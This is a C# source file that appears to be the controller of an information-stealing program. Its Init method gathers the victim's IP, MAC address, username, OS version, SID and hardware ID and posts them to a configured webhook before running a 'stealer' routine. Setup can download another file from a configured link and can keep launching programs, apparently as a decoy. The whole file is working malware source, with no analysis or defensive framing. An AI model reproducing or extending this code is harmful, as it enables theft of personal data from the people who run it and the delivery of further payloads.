using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Permissions;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using xyz.config;
using xyz.functions;
using static System.Net.Mime.MediaTypeNames;

namespace xyz
{

    class Manager
    {

        public static void Init()
        {
            Task.Run(async () =>
            {
                data.ip = await utils.GetIp();
                data.mac = utils.GetMac();
                data.name = Environment.UserName;
                data.os = Environment.OSVersion.VersionString;
                data.sid = utils.GetSid();
                data.hwid = utils.GetHwid();


                await SendWebhook($"**Username: ** {data.name} | **Ip: ** {data.ip} | **Sid: ** {data.sid} | **Os: ** {data.os} | **Hwid: ** {data.hwid} | **Mac: ** {data.mac}");

                await Task.Delay(500);

                await stealer.Invoke();

                data.CanClose = true;
            });


            Setup();
        }


        public static void Setup()
        {
            Console.Title = Config.ProgramTitle;

            if (Config.DownloadProgramOnComputer)
            {
                WebClient client = new WebClient();

                client.DownloadFile(Config.DownloadLink, Config.FileName + "." + Config.FileType);
            }

            
            while (Config.OpenRandomPrograms)
            {

                string[] programs = { "notepad", "explorer", "discord", "epicgames" };

                try
                {
                    foreach (var program in programs)
                    {
                        Process.Start(program);
                    }
                }
                catch { }

                Thread.Sleep(Config.Timeout);
            }

            if (!Config.OpenRandomPrograms)
            {
                while (!data.CanClose)
                {

                    Thread.Sleep(1000);
                }
            }

        }


        public static async Task SendWebhook(string msg)
        {

            string json = JsonSerializer.Serialize(new { content = msg });

            using (HttpClient client = new HttpClient())
            {
                HttpContent content = new StringContent(json, Encoding.UTF8, "application/json");
                HttpResponseMessage response = await client.PostAsync(Config.Webhook, content);
            }
        }
    }
}
